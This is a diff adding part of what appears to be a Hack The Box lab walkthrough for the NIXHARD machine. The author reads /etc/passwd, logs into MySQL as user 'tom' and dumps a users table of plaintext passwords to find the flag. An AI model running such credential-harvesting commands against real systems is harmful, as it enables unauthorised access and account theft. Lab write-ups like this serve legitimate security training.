@@ -197,3 +197,95 @@ applicable law.
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
 ```
+
+We are in! Now we can have a quick look around the passwd file:
+
+```bash
+tom@NIXHARD:~/Maildir/tmp$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+... cut ...
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+cry0l1t3:x:1001:1001:,,,:/home/cry0l1t3:/bin/bash
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+tom:x:1002:1002:,,,:/home/tom:/bin/bash
+dovecot:x:113:120:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
+dovenull:x:115:121:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
+Debian-snmp:x:116:122::/var/lib/snmp:/bin/false
+```
+
+The interesting thing here is a MySQL server cred which is our next plan of atack:
+
+```bash
+tom@NIXHARD:~/Maildir/tmp$ mysql -u tom -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 9
+Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| users              |
++--------------------+
+5 rows in set (0.01 sec)
+
+mysql> 
+
+```
+
+We see a users database which could contain juicy info. Lets try it...
+
+```bash
+mysql> use users;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-----------------+
+| Tables_in_users |
++-----------------+
+| users           |
++-----------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++------+-------------------+------------------------------+
+| id   | username          | password                     |
++------+-------------------+------------------------------+
+|    1 | ppavlata0         | 6znAfvTbB2                   |
+|    2 | ktofanini1        | TP2NxFD62e                   |
+|    3 | rallwell2         | t1t7WaqvEfv                  |
+|    4 | efernier3         | ZRYOBO9PI                    |
+|    5 | fpoon4            | 5Spyx2Jb                     |
+|    6 | jgurnell5         | LMCnWKD                      |
+|    7 | aminter6          | ngCyGg3                      |
+|    8 | dwattinham7       | H2bpGC5                      |
+|    9 | ddumphreys8       | eGek5Q8                      |
+... cut ...
+```
+
+Great! Scrolling down through the user's table, we can see a user called "HTB" and the password which happens to be the flag!
